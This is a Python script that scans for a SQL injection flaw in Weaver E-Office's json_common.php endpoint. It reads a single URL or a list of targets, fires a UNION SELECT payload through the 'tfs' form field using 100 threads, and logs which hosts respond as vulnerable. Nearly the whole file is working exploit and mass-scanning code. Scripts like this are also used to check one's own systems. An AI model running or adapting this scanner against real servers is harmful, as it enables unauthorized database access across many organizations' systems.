import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微E-Office json_common.php SQL注入漏洞')
    parser.add_argument('-u','--url',help='plaese input attack url')
    parser.add_argument('-f','--file',help='please input attack file')
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                       
        poc(agres.url)                              
    elif agres.file and not agres.url:                
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                    
        mp.map(poc, url_list)               
        mp.close()                        
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')
def banner():
    text="""

  ______       ____   __  __ _              _                                                                    _           
 |  ____|     / __ \ / _|/ _(_)            (_)                                                                  | |          
 | |__ ______| |  | | |_| |_ _  ___ ___     _ ___  ___  _ __    ___ ___  _ __ ___  _ __ ___   ___  _ __    _ __ | |__  _ __  
 |  __|______| |  | |  _|  _| |/ __/ _ \   | / __|/ _ \| '_ \  / __/ _ \| '_ ` _ \| '_ ` _ \ / _ \| '_ \  | '_ \| '_ \| '_ \ 
 | |____     | |__| | | | | | | (_|  __/   | \__ \ (_) | | | || (_| (_) | | | | | | | | | | | (_) | | | |_| |_) | | | | |_) |
 |______|     \____/|_| |_| |_|\___\___|   | |___/\___/|_| |_| \___\___/|_| |_| |_|_| |_| |_|\___/|_| |_(_) .__/|_| |_| .__/ 
                                          _/ |             ______                                         | |         | |    
                                         |__/             |______|                                        |_|         |_|    
"""
def poc(target):
    url = target + '/building/json_common.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = {
        'tfs': 'city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333'
    }
    try:
        respnose = requests.post(url,headers=headers,data=data,timeout=6,verify=False)
        if respnose.status_code == 200 and 'eoffice' in respnose.text :
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target} Vulnerability exists'+'\n')
        else:
            print(f'[-]{target} Vulnerability does not exists')
    except:
        print(f'[*]{target} server error')


if __name__=='__main__':
    main()